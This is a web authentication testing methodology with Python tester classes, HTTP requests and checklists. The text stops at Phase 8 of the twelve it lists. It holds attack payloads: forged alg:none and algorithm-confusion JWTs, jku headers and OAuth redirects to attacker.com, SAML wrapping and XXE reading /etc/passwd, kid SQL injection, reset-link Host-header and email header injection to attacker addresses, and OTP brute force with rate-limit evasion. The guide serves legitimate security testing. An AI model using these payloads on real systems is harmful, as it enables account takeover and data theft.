# Authentication Testing Methodology

## Overview

This document provides a comprehensive 12-step methodology for testing authentication and authorization security in web applications and APIs. Each phase includes detailed checklists, test matrices, and step-by-step procedures based on real-world vulnerability research and bug bounty findings.

---

## Table of Contents

1. [Phase 1: Reconnaissance and Fingerprinting](#phase-1-reconnaissance-and-fingerprinting)
2. [Phase 2: Authentication Mechanism Identification](#phase-2-authentication-mechanism-identification)
3. [Phase 3: Session Management Analysis](#phase-3-session-management-analysis)
4. [Phase 4: Token Analysis (JWT/OAuth/SAML)](#phase-4-token-analysis-jwtoauthsaml)
5. [Phase 5: MFA Assessment](#phase-5-mfa-assessment)
6. [Phase 6: Authorization Testing](#phase-6-authorization-testing)
7. [Phase 7: Password Reset Evaluation](#phase-7-password-reset-evaluation)
8. [Phase 8: Registration Security](#phase-8-registration-security)
9. [Phase 9: Account Enumeration](#phase-9-account-enumeration)
10. [Phase 10: Exploitation and Chaining](#phase-10-exploitation-and-chaining)
11. [Phase 11: Impact Assessment](#phase-11-impact-assessment)
12. [Phase 12: Reporting](#phase-12-reporting)

---

## Phase 1: Reconnaissance and Fingerprinting

### Objective
Gather comprehensive information about the target's authentication infrastructure, technologies, and potential attack surface.

### Step-by-Step Procedure

#### 1.1 Technology Stack Identification

```bash
# Identify web server and framework
curl -I https://target.com | grep -i "server\|x-powered-by\|x-aspnet"

# Check for common framework indicators
curl -s https://target.com/login | grep -i "csrf\|token\|framework"

# Identify JavaScript frameworks
curl -s https://target.com/login | grep -oE "react|angular|vue|jquery" | sort -u
```

#### 1.2 Authentication Endpoint Discovery

```bash
# Directory enumeration for auth endpoints
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404

# API endpoint discovery
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common authentication paths to check
endpoints=(
    "/login" "/signin" "/auth" "/authenticate"
    "/api/login" "/api/auth" "/api/v1/auth"
    "/oauth" "/oauth2" "/oauth/authorize"
    "/saml" "/sso" "/adfs"
    "/register" "/signup" "/create-account"
    "/forgot-password" "/reset-password"
    "/2fa" "/mfa" "/otp" "/verify"
)
```

#### 1.3 SSO and Federation Discovery

```http
# Check for OIDC configuration
GET /.well-known/openid-configuration HTTP/1.1
Host: target.com

# Check for SAML metadata
GET /saml/metadata HTTP/1.1
GET /FederationMetadata/2007-06/FederationMetadata.xml HTTP/1.1

# Check for OAuth endpoints
GET /.well-known/oauth-authorization-server HTTP/1.1
```

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Web server identified | [ ] | |
| Application framework identified | [ ] | |
| Authentication endpoints mapped | [ ] | |
| SSO/Federation detected | [ ] | |
| API versions enumerated | [ ] | |
| Mobile API endpoints checked | [ ] | |
| Admin panel locations tested | [ ] | |
| Error page information leakage checked | [ ] | |

### Tools
- Burp Suite (Proxy, Scanner)
- ffuf/gobuster (Directory enumeration)
- Wappalyzer (Technology detection)
- Nuclei (Automated scanning)

---

## Phase 2: Authentication Mechanism Identification

### Objective
Identify all authentication mechanisms in use and understand their implementation details.

### Step-by-Step Procedure

#### 2.1 Primary Authentication Analysis

```http
# Capture login request
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "test@test.com", "password": "TestPass123!"}

# Analyze response for authentication method indicators
# Look for: JWT, session cookies, API keys, OAuth tokens
```

#### 2.2 Authentication Method Classification

```
Traditional Methods:
[ ] Form-based authentication
[ ] HTTP Basic authentication
[ ] HTTP Digest authentication
[ ] NTLM authentication
[ ] Kerberos authentication

Token-Based:
[ ] Session cookies
[ ] JWT (JSON Web Tokens)
[ ] API keys
[ ] Bearer tokens
[ ] Refresh tokens

Modern Protocols:
[ ] OAuth 2.0
[ ] OpenID Connect
[ ] SAML 2.0
[ ] WS-Federation

Passwordless:
[ ] Magic links
[ ] WebAuthn/FIDO2
[ ] Passkeys
[ ] Certificate-based
```

#### 2.3 Authentication Flow Mapping

```python
#!/usr/bin/env python3
"""Authentication Flow Mapper"""

import requests
from urllib.parse import urlparse

class AuthFlowMapper:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.flow_steps = []

    def map_login_flow(self, username, password):
        """Map the complete authentication flow"""

        # Step 1: Initial page load
        resp = self.session.get(f"{self.base_url}/login")
        self.flow_steps.append({
            'step': 'initial_load',
            'cookies': dict(self.session.cookies),
            'csrf_token': self.extract_csrf(resp.text)
        })

        # Step 2: Submit credentials
        resp = self.session.post(f"{self.base_url}/login", data={
            'username': username,
            'password': password
        })
        self.flow_steps.append({
            'step': 'credential_submit',
            'status': resp.status_code,
            'redirect': resp.headers.get('Location'),
            'cookies': dict(self.session.cookies)
        })

        # Step 3: Check for MFA requirement
        if 'mfa' in resp.url or '2fa' in resp.url:
            self.flow_steps.append({
                'step': 'mfa_required',
                'type': self.detect_mfa_type(resp)
            })

        return self.flow_steps

    def extract_csrf(self, html):
        """Extract CSRF token from HTML"""
        import re
        patterns = [
            r'name="csrf[_-]?token"\s+value="([^"]+)"',
            r'name="_token"\s+value="([^"]+)"',
            r'"csrfToken":\s*"([^"]+)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def detect_mfa_type(self, response):
        """Detect type of MFA in use"""
        indicators = {
            'totp': ['authenticator', 'totp', 'google auth'],
            'sms': ['sms', 'text message', 'phone number'],
            'email': ['email code', 'email verification'],
            'push': ['push notification', 'approve'],
            'hardware': ['security key', 'yubikey', 'fido']
        }
        for mfa_type, keywords in indicators.items():
            if any(kw in response.text.lower() for kw in keywords):
                return mfa_type
        return 'unknown'
```

### Test Matrix

| Test | Traditional | JWT | OAuth | SAML | Passwordless |
|------|-------------|-----|-------|------|--------------|
| Credential brute force | x | x | x | | |
| Session fixation | x | | | | |
| Token manipulation | | x | x | x | |
| Signature bypass | | x | | x | |
| Redirect manipulation | | | x | x | |
| Replay attacks | x | x | x | x | x |

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| All auth methods documented | [ ] | |
| Authentication flow mapped | [ ] | |
| Token types identified | [ ] | |
| CSRF protection analyzed | [ ] | |
| Rate limiting detected | [ ] | |
| Account lockout policy tested | [ ] | |

---

## Phase 3: Session Management Analysis

### Objective
Evaluate session handling, cookie security, and session lifecycle management.

### Step-by-Step Procedure

#### 3.1 Session Token Analysis

```python
#!/usr/bin/env python3
"""Session Token Analyzer"""

import requests
import hashlib
import math
from collections import Counter

class SessionAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.tokens = []

    def collect_tokens(self, count=100):
        """Collect multiple session tokens"""
        for _ in range(count):
            session = requests.Session()
            resp = session.get(self.target_url)
            for cookie in session.cookies:
                if 'session' in cookie.name.lower():
                    self.tokens.append(cookie.value)
        return self.tokens

    def analyze_entropy(self, token):
        """Calculate Shannon entropy"""
        if not token:
            return 0
        freq = Counter(token)
        length = len(token)
        entropy = -sum((count/length) * math.log2(count/length)
                      for count in freq.values())
        return entropy * length

    def check_predictability(self):
        """Check for predictable patterns"""
        results = {
            'sequential': self.check_sequential(),
            'time_based': self.check_time_based(),
            'weak_entropy': self.check_weak_entropy()
        }
        return results

    def check_sequential(self):
        """Check for sequential token generation"""
        if len(self.tokens) < 2:
            return {'status': 'insufficient_data'}
        try:
            int_tokens = [int(t, 16) if all(c in '0123456789abcdef' for c in t.lower())
                         else int(t) for t in self.tokens]
            diffs = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
            if len(set(diffs)) == 1:
                return {'vulnerable': True, 'increment': diffs[0]}
        except:
            pass
        return {'vulnerable': False}

    def check_time_based(self):
        """Check if tokens correlate with timestamp"""
        # Analyze if token values correlate with collection time
        return {'status': 'manual_review_needed'}

    def check_weak_entropy(self):
        """Check for insufficient entropy"""
        avg_entropy = sum(self.analyze_entropy(t) for t in self.tokens) / len(self.tokens)
        if avg_entropy < 64:
            return {'vulnerable': True, 'entropy': avg_entropy}
        return {'vulnerable': False, 'entropy': avg_entropy}
```

#### 3.2 Cookie Security Analysis

```http
# Capture Set-Cookie headers and analyze attributes
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600

# Check for missing security attributes
# Required:
# - Secure (HTTPS only)
# - HttpOnly (No JavaScript access)
# - SameSite (CSRF protection)
```

### Cookie Attribute Checklist

| Attribute | Required | Impact if Missing |
|-----------|----------|-------------------|
| Secure | Yes | Token sent over HTTP |
| HttpOnly | Yes | XSS can steal token |
| SameSite=Strict/Lax | Yes | CSRF vulnerability |
| Path=/ or specific | Yes | Token scope issues |
| Max-Age/Expires | Yes | Indefinite session |
| Domain | Context | Cross-subdomain issues |

#### 3.3 Session Lifecycle Testing

```http
# Test session fixation
# Step 1: Get session before authentication
GET /login HTTP/1.1
Cookie: session=ATTACKER_SESSION

# Step 2: Authenticate with same session
POST /login HTTP/1.1
Cookie: session=ATTACKER_SESSION
username=user&password=pass

# Step 3: Check if session ID changed after auth
# VULNERABLE if same session ID is used

# Test session invalidation on logout
# Step 1: Note session token
# Step 2: Logout
# Step 3: Try to use old session token
GET /dashboard HTTP/1.1
Cookie: session=OLD_SESSION_TOKEN
# VULNERABLE if still works

# Test concurrent session handling
# Login from multiple locations
# Check if old sessions are invalidated
```

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Session ID entropy > 128 bits | [ ] | |
| Session regeneration on auth | [ ] | |
| Secure cookie flag set | [ ] | |
| HttpOnly flag set | [ ] | |
| SameSite attribute configured | [ ] | |
| Session timeout implemented | [ ] | |
| Logout invalidates session | [ ] | |
| Concurrent session limits | [ ] | |
| Session binding (IP/UA) | [ ] | |

---

## Phase 4: Token Analysis (JWT/OAuth/SAML)

### Objective
Identify and exploit vulnerabilities in token-based authentication systems.

### Step-by-Step Procedure

#### 4.1 JWT Analysis

```python
#!/usr/bin/env python3
"""JWT Security Analyzer"""

import base64
import json
import hmac
import hashlib

class JWTAnalyzer:
    def __init__(self, token):
        self.token = token
        self.parts = token.split('.')
        self.header = self.decode_part(self.parts[0])
        self.payload = self.decode_part(self.parts[1])
        self.signature = self.parts[2]

    def decode_part(self, part):
        """Base64URL decode JWT part"""
        padding = 4 - len(part) % 4
        part += '=' * padding
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)

    def analyze(self):
        """Run all JWT security checks"""
        return {
            'header': self.header,
            'payload': self.payload,
            'vulnerabilities': self.check_vulnerabilities()
        }

    def check_vulnerabilities(self):
        """Check for common JWT vulnerabilities"""
        vulns = []

        # Algorithm none attack
        if self.header.get('alg', '').lower() == 'none':
            vulns.append({
                'type': 'ALG_NONE',
                'severity': 'CRITICAL',
                'description': 'Algorithm set to none - signature not required'
            })

        # Weak algorithm
        if self.header.get('alg') in ['HS256', 'HS384', 'HS512']:
            vulns.append({
                'type': 'SYMMETRIC_ALG',
                'severity': 'MEDIUM',
                'description': 'Symmetric algorithm - test for weak secret'
            })

        # Missing expiration
        if 'exp' not in self.payload:
            vulns.append({
                'type': 'NO_EXPIRATION',
                'severity': 'HIGH',
                'description': 'Token has no expiration claim'
            })

        # Sensitive data in payload
        sensitive_fields = ['password', 'secret', 'key', 'ssn', 'credit']
        for field in self.payload.keys():
            if any(s in field.lower() for s in sensitive_fields):
                vulns.append({
                    'type': 'SENSITIVE_DATA',
                    'severity': 'MEDIUM',
                    'field': field
                })

        # JKU/X5U injection possibility
        if 'jku' in self.header or 'x5u' in self.header:
            vulns.append({
                'type': 'KEY_URL_INJECTION',
                'severity': 'HIGH',
                'description': 'External key URL specified - test for injection'
            })

        return vulns

    def test_algorithm_confusion(self, public_key):
        """Test RS256 to HS256 algorithm confusion"""
        # Create token with HS256 using public key as secret
        header = {'alg': 'HS256', 'typ': 'JWT'}
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).rstrip(b'=').decode()

        signing_input = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            public_key.encode(),
            signing_input.encode(),
            hashlib.sha256
        ).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

        return f"{signing_input}.{sig_b64}"

    def test_none_algorithm(self):
        """Create token with alg:none"""
        header = {'alg': 'none', 'typ': 'JWT'}
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).rstrip(b'=').decode()

        return f"{header_b64}.{payload_b64}."
```

#### 4.2 JWT Attack Payloads

```
# Algorithm None Variants
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}

# Algorithm Confusion (RS256 -> HS256)
# Use server's RSA public key as HMAC secret

# Key ID Injection
{"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
{"alg": "HS256", "typ": "JWT", "kid": "key1' UNION SELECT 'secret'--"}

# JKU/X5U Injection
{"alg": "RS256", "typ": "JWT", "jku": "https://attacker.com/jwks.json"}
{"alg": "RS256", "typ": "JWT", "x5u": "https://attacker.com/cert.pem"}

# Common weak secrets to test
secrets=("secret" "password" "123456" "changeme" "jwt_secret")
```

#### 4.3 OAuth 2.0 Testing

```http
# Test redirect_uri validation
GET /oauth/authorize?
    client_id=app&
    redirect_uri=https://attacker.com/callback&
    response_type=code HTTP/1.1

# Redirect URI bypass techniques
redirect_uri=https://legitimate.com@attacker.com
redirect_uri=https://legitimate.com.attacker.com
redirect_uri=https://legitimate.com%2F%2Eattacker.com
redirect_uri=https://legitimate.com/callback?next=https://attacker.com
redirect_uri=https://legitimate.com/callback/../../../attacker.com

# Test state parameter
# CSRF on OAuth - missing state
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback HTTP/1.1
# Should require state parameter

# Test PKCE bypass
# Try authorization code exchange without code_verifier
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTHCODE&
client_id=app&
redirect_uri=https://app.com/callback
# Should fail without code_verifier if PKCE was used
```

#### 4.4 SAML Attack Vectors

```xml
<!-- Signature Wrapping Attack -->
<!-- Move legitimate signature and inject unsigned assertion -->
<samlp:Response>
    <saml:Assertion ID="legitimate">
        <ds:Signature>...</ds:Signature>
        <!-- Legitimate signed assertion -->
    </saml:Assertion>
    <saml:Assertion ID="malicious">
        <!-- Attacker's unsigned assertion -->
        <saml:Subject>
            <saml:NameID>admin@target.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>

<!-- Comment Injection -->
<saml:NameID>victim@target.com<!---->.evil.com</saml:NameID>
<!-- Some parsers may process: victim@target.com, others: victim@target.com.evil.com -->

<!-- XXE in SAML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
    <saml:NameID>&xxe;</saml:NameID>
</samlp:Response>
```

### Token Analysis Checklist

| Test | JWT | OAuth | SAML |
|------|-----|-------|------|
| Algorithm manipulation | x | | |
| Signature verification bypass | x | | x |
| Token tampering | x | x | x |
| Redirect URI validation | | x | |
| State/CSRF protection | | x | |
| PKCE implementation | | x | |
| XML signature wrapping | | | x |
| XXE injection | | | x |
| Assertion replay | | | x |
| Token expiration | x | x | x |

---

## Phase 5: MFA Assessment

### Objective
Identify vulnerabilities in multi-factor authentication implementations.

### Step-by-Step Procedure

#### 5.1 MFA Bypass Testing

```python
#!/usr/bin/env python3
"""MFA Bypass Tester"""

import requests

class MFABypassTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)

    def test_direct_access(self):
        """Test direct access to post-MFA endpoints"""
        endpoints = [
            '/dashboard', '/api/user', '/account/settings',
            '/admin', '/api/v1/me', '/profile', '/home'
        ]

        results = []
        for endpoint in endpoints:
            resp = self.session.get(
                f"{self.base_url}{endpoint}",
                allow_redirects=False
            )
            if resp.status_code == 200:
                results.append({
                    'endpoint': endpoint,
                    'status': 'VULNERABLE',
                    'description': 'MFA bypassed via direct access'
                })
        return results

    def test_step_manipulation(self):
        """Test authentication step manipulation"""
        payloads = [
            {"step": "complete", "mfa_verified": "true"},
            {"auth_state": "authenticated", "mfa_required": "false"},
            {"skip_2fa": "true"},
            {"authentication_level": "full"}
        ]

        results = []
        for payload in payloads:
            resp = self.session.post(
                f"{self.base_url}/api/auth/verify",
                json=payload
            )
            if resp.status_code == 200 and 'error' not in resp.text.lower():
                results.append({
                    'payload': payload,
                    'status': 'POTENTIAL_BYPASS'
                })
        return results

    def test_response_manipulation(self):
        """Document response manipulation tests"""
        return {
            'test': 'Use Burp Suite Match/Replace',
            'replacements': [
                '"mfa_verified":false -> "mfa_verified":true',
                '"success":false -> "success":true',
                '"2fa_required":true -> "2fa_required":false'
            ]
        }
```

#### 5.2 OTP Brute Force Testing

```http
# Test rate limiting on OTP endpoint
POST /api/verify-otp HTTP/1.1
Content-Type: application/json
Cookie: session=TOKEN

{"otp": "000000"}
{"otp": "000001"}
{"otp": "000002"}
...

# Rate limit bypass techniques
# IP rotation via headers
X-Forwarded-For: 192.168.1.{RANDOM}
X-Real-IP: 10.0.0.{RANDOM}
X-Originating-IP: 172.16.0.{RANDOM}

# Parameter manipulation
{"otp": "123456"}
{"otp": " 123456"}
{"otp": "123456 "}
{"otp": ["123456"]}
```

#### 5.3 OTP Security Testing

```python
#!/usr/bin/env python3
"""OTP Security Tester"""

import requests
import time
import re

class OTPSecurityTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session_cookie = session_cookie

    def test_otp_reuse(self, valid_otp):
        """Test if OTP can be reused"""
        results = []

        # First use
        resp1 = requests.post(
            f"{self.base_url}/api/verify-otp",
            json={"otp": valid_otp},
            cookies={"session": self.session_cookie}
        )
        results.append(("First use", resp1.status_code))

        # Immediate reuse
        resp2 = requests.post(
            f"{self.base_url}/api/verify-otp",
            json={"otp": valid_otp},
            cookies={"session": self.session_cookie}
        )
        results.append(("Reuse attempt", resp2.status_code))

        if resp2.status_code == 200:
            return {'vulnerable': True, 'description': 'OTP can be reused'}
        return {'vulnerable': False}

    def test_otp_leakage(self, response):
        """Check for OTP leakage in response"""
        leaks = []

        # Check response body
        patterns = [
            r'(?:otp|code|token)["\s:=]+["\s]*(\d{4,8})',
            r'(?:expected|correct)["\s:]+["\s]*(\d{4,8})'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                leaks.append({'location': 'body', 'values': matches})

        # Check headers
        for header, value in response.headers.items():
            if any(x in header.lower() for x in ['otp', 'code', 'debug']):
                leaks.append({'location': 'header', 'header': header, 'value': value})

        return leaks

    def test_timing_attack(self, base_otp="000000"):
        """Test for timing-based OTP leakage"""
        times = {}
        for digit in range(10):
            test_otp = str(digit) + base_otp[1:]
            measurements = []
            for _ in range(10):
                start = time.perf_counter()
                requests.post(
                    f"{self.base_url}/api/verify-otp",
                    json={"otp": test_otp},
                    cookies={"session": self.session_cookie}
                )
                end = time.perf_counter()
                measurements.append(end - start)
            times[digit] = sum(measurements) / len(measurements)
        return times
```

### MFA Testing Checklist

| Test | Status | Notes |
|------|--------|-------|
| Direct endpoint access after partial auth | [ ] | |
| Step parameter manipulation | [ ] | |
| Response body/status manipulation | [ ] | |
| Client-side auth state modification | [ ] | |
| OTP brute force (with rate limit bypass) | [ ] | |
| OTP reuse testing | [ ] | |
| OTP leakage in response/headers/cookies | [ ] | |
| OTP timing analysis | [ ] | |
| Backup code brute force | [ ] | |
| Recovery flow manipulation | [ ] | |
| Device trust token manipulation | [ ] | |
| Session fixation post-MFA | [ ] | |
| Race condition exploitation | [ ] | |

---

## Phase 6: Authorization Testing

### Objective
Test access control mechanisms for vertical and horizontal privilege escalation.

### Step-by-Step Procedure

#### 6.1 Vertical Privilege Escalation

```http
# Test access to admin functions as regular user
GET /admin/users HTTP/1.1
Cookie: session=REGULAR_USER_TOKEN

# Test parameter manipulation for privilege escalation
POST /api/user/update HTTP/1.1
Content-Type: application/json
Cookie: session=REGULAR_USER_TOKEN

{"user_id": 1, "role": "admin"}
{"is_admin": true}
{"permissions": ["admin", "write", "delete"]}
{"access_level": 9999}
```

#### 6.2 Horizontal Privilege Escalation (IDOR)

```http
# Test direct object reference manipulation
GET /api/user/123 HTTP/1.1
Cookie: session=USER_456_TOKEN

# Test IDOR patterns
GET /api/user/122 HTTP/1.1
GET /api/user/124 HTTP/1.1
GET /api/user/../admin HTTP/1.1

# UUID-based IDOR
GET /api/document/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
# Enumerate or predict UUIDs
```

#### 6.3 Authorization Testing Script

```python
#!/usr/bin/env python3
"""Authorization Testing Framework"""

import requests

class AuthorizationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.users = {
            'admin': {'token': 'ADMIN_TOKEN', 'role': 'admin'},
            'user1': {'token': 'USER1_TOKEN', 'role': 'user'},
            'user2': {'token': 'USER2_TOKEN', 'role': 'user'}
        }

    def test_vertical_escalation(self, admin_endpoints):
        """Test if regular users can access admin endpoints"""
        results = []
        for endpoint in admin_endpoints:
            for user, data in self.users.items():
                if data['role'] == 'user':
                    resp = requests.get(
                        f"{self.base_url}{endpoint}",
                        headers={"Authorization": f"Bearer {data['token']}"}
                    )
                    if resp.status_code == 200:
                        results.append({
                            'endpoint': endpoint,
                            'user': user,
                            'status': 'VULNERABLE'
                        })
        return results

    def test_horizontal_escalation(self, user_endpoints):
        """Test if users can access other users' data"""
        results = []
        for endpoint_template in user_endpoints:
            # User1 trying to access User2's data
            endpoint = endpoint_template.replace('{user_id}', 'USER2_ID')
            resp = requests.get(
                f"{self.base_url}{endpoint}",
                headers={"Authorization": f"Bearer {self.users['user1']['token']}"}
            )
            if resp.status_code == 200 and 'user2' in resp.text.lower():
                results.append({
                    'endpoint': endpoint,
                    'status': 'IDOR_VULNERABLE'
                })
        return results

    def test_parameter_pollution(self, endpoint, base_params):
        """Test for parameter pollution vulnerabilities"""
        pollution_params = [
            {'role': 'admin'},
            {'is_admin': 'true'},
            {'admin': '1'},
            {'permissions[]': 'admin'}
        ]

        results = []
        for extra in pollution_params:
            params = {**base_params, **extra}
            resp = requests.post(
                f"{self.base_url}{endpoint}",
                json=params,
                headers={"Authorization": f"Bearer {self.users['user1']['token']}"}
            )
            if resp.status_code == 200:
                results.append({
                    'params': extra,
                    'status': 'TEST_REQUIRED'
                })
        return results
```

### Authorization Matrix

| Resource | Anonymous | User | Moderator | Admin |
|----------|-----------|------|-----------|-------|
| View public content | x | x | x | x |
| View own profile | | x | x | x |
| Edit own profile | | x | x | x |
| View all profiles | | | x | x |
| Edit all profiles | | | | x |
| Admin panel | | | | x |
| User management | | | | x |

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Role-based access tested | [ ] | |
| IDOR on all object references | [ ] | |
| Parameter manipulation tested | [ ] | |
| HTTP method override tested | [ ] | |
| API versioning bypass tested | [ ] | |
| Function-level access control | [ ] | |

---

## Phase 7: Password Reset Evaluation

### Objective
Identify vulnerabilities in password reset and account recovery mechanisms.

### Step-by-Step Procedure

#### 7.1 Password Reset Token Analysis

```python
#!/usr/bin/env python3
"""Password Reset Token Analyzer"""

import requests
import time
import hashlib

class PasswordResetAnalyzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.tokens = []

    def collect_tokens(self, email, count=10):
        """Collect multiple reset tokens"""
        for _ in range(count):
            resp = requests.post(
                f"{self.base_url}/api/forgot-password",
                json={"email": email}
            )
            # Token would typically be sent via email
            # For testing, check if exposed in response
            time.sleep(1)
        return self.tokens

    def analyze_token_pattern(self, tokens):
        """Analyze tokens for predictable patterns"""
        analysis = {
            'length_consistent': len(set(len(t) for t in tokens)) == 1,
            'charset': self.identify_charset(tokens),
            'potential_timestamp': self.check_timestamp_pattern(tokens),
            'sequential': self.check_sequential(tokens)
        }
        return analysis

    def identify_charset(self, tokens):
        """Identify character set used in tokens"""
        all_chars = set(''.join(tokens))
        if all_chars <= set('0123456789'):
            return 'numeric_only'
        elif all_chars <= set('0123456789abcdef'):
            return 'hex'
        elif all_chars <= set('0123456789abcdefghijklmnopqrstuvwxyz'):
            return 'alphanumeric_lower'
        return 'mixed'

    def check_timestamp_pattern(self, tokens):
        """Check if tokens contain timestamp patterns"""
        for token in tokens:
            # Check for Unix timestamp
            try:
                for i in range(len(token) - 9):
                    substr = token[i:i+10]
                    if substr.isdigit():
                        ts = int(substr)
                        if 1600000000 < ts < 2000000000:
                            return {'found': True, 'position': i}
            except:
                pass
        return {'found': False}

    def check_sequential(self, tokens):
        """Check for sequential token generation"""
        try:
            int_tokens = [int(t, 16) for t in tokens]
            diffs = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
            if len(set(diffs)) == 1 and diffs[0] != 0:
                return {'sequential': True, 'increment': diffs[0]}
        except:
            pass
        return {'sequential': False}
```

#### 7.2 Password Reset Vulnerabilities

```http
# Token leakage in Referer header
# Step 1: Click password reset link
GET /reset-password?token=SECRET_TOKEN HTTP/1.1

# Step 2: Page loads external resource
# Token leaks in Referer header to external site

# Host header injection
POST /api/forgot-password HTTP/1.1
Host: attacker.com

{"email": "victim@example.com"}
# Reset link sent: https://attacker.com/reset?token=xxx

# Token reuse testing
# Use same token multiple times
POST /api/reset-password HTTP/1.1
{"token": "USED_TOKEN", "password": "NewPass1!"}
{"token": "USED_TOKEN", "password": "NewPass2!"}

# Token not invalidated after password change
POST /api/reset-password HTTP/1.1
{"token": "VALID_TOKEN", "password": "NewPass1!"}
# Later...
POST /api/reset-password HTTP/1.1
{"token": "VALID_TOKEN", "password": "AttackerPass!"}
```

#### 7.3 Password Reset Testing Payloads

```http
# Email parameter manipulation
# Multiple emails
{"email": ["victim@example.com", "attacker@evil.com"]}
{"email": "victim@example.com,attacker@evil.com"}
{"email": "victim@example.com\ncc:attacker@evil.com"}

# Carbon copy injection
{"email": "victim@example.com\nCc: attacker@evil.com"}
{"email": "victim@example.com\nBcc: attacker@evil.com"}

# Email header injection
{"email": "victim@example.com\r\nX-Injected: true"}

# Unicode normalization
{"email": "victim@example.com\u2028attacker@evil.com"}
```

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Token entropy analysis | [ ] | |
| Token predictability check | [ ] | |
| Token expiration tested | [ ] | |
| Token invalidation after use | [ ] | |
| Token invalidation after password change | [ ] | |
| Host header injection | [ ] | |
| Email parameter manipulation | [ ] | |
| Referer leakage | [ ] | |
| Rate limiting on reset requests | [ ] | |

---

## Phase 8: Registration Security

### Objective
Test registration process for security vulnerabilities and abuse potential.

### Step-by-Step Procedure

#### 8.1 Registration Flow Testing

```http
# Mass assignment testing
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "username": "testuser",
    "email": "test@example.com",
    "password": "TestPass123!",
    "role": "admin",
    "is_admin": true,
    "permissions": ["admin"],
    "verified": true,
    "email_verified": true
}

# Duplicate registration
# Register same email twice
POST /api/register HTTP/1.1
{"email": "victim@example.com", "password": "pass1"}

POST /api/register HTTP/1.1
{"email": "victim@example.com", "password": "pass2"}

# Unicode normalization issues
POST /api/register HTTP/1.1
{"email": "admin@example.com", "password": "pass"}  # Already exists

POST /api/register HTTP/1.1
{"email": "ADMIN@example.com", "password": "attacker"}  # Different case

POST /api/register HTTP/1.1
{"email": "admin\u200B@example.com", "password": "attacker"}  # Zero-width space
```

#### 8.2 Email Verification Bypass

```http
# Skip verification step
POST /api/register HTTP/1.1
{"email": "test@example.com", "password": "pass", "verified": true}

# Manipulate verification token
GET /verify-email?token=WEAK_TOKEN HTTP/1.1

# Verify different email than registered
POST /api/verify-email HTTP/1.1
{"token": "TOKEN_FOR_USER_A", "email": "userB@example.com"}

# Response manipulation
# Intercept and change: {"verified": false} to {"verified": true}
```

#### 8.3 Registration Security Script

```python
#!/usr/bin/env python3
"""Registration Security Tester"""

import requests

class RegistrationTester:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_mass_assignment(self, base_data):
        """Test for mass assignment vulnerabilities"""
        privilege_fields = [
            ('role', ['admin', 'administrator', 'superuser']),
            ('is_admin', [True, 1, 'true', 'yes']),
            ('admin', [True, 1]),
            ('permissions', [['admin'], ['*'], ['read', 'write', 'delete']]),
            ('access_level', [10, 99, 999]),
            ('verified', [True, 1]),
            ('email_verified', [True, 1]),
            ('account_status', ['active', 'approved'])
        ]

        results = []
        for field, values in privilege_fields:
            for value in values:
                payload = base_data.copy()
                payload[field] = value

                resp = requests.post(
                    f"{self.base_url}/api/register",
                    json=payload
                )

                if resp.status_code in [200, 201]:
                    # Check if field was actually set
                    results.append({
                        'field': field,
                        'value': value,
                        'status': 'ACCEPTED'
                    })

        return results

    def test_email_variations(self, target_email):
        """Test email normalization issues"""
        domain = target_email.split('@')[1]
        local = target_email.split('@')[0]

        variations = [
            f"{local.upper()}@{domain}",  # Case
            f"{local}@{domain.upper()}",
            f"{local}\u200b@{domain}",  # Zero-width space
            f"{local}+tag@{domain}",  # Plus addressing
            f"{local}.@{domain}",  # Trailing dot
            f".{local}@{domain}",  # Leading dot
            f"{local}@{domain}.",  # Trailing dot in domain
        ]

        results = []
        for email in variations:
            resp = requests.post(
                f"{self.base_url}/api/register",
                json={"email": email, "password": "TestPass123!"}
            )
            results.append({
                'email': email,
                'status': resp.status_code
            })

        return results
```

### Checklist

| Item | Status | Notes |
|------|--------|-------|
| Mass assignment tested | [ ] | |
| Duplicate email handling | [ ] | |
| Email normalization | [ ] | |
| Username restrictions | [ ] | |
| Password policy tested | [ ] | |
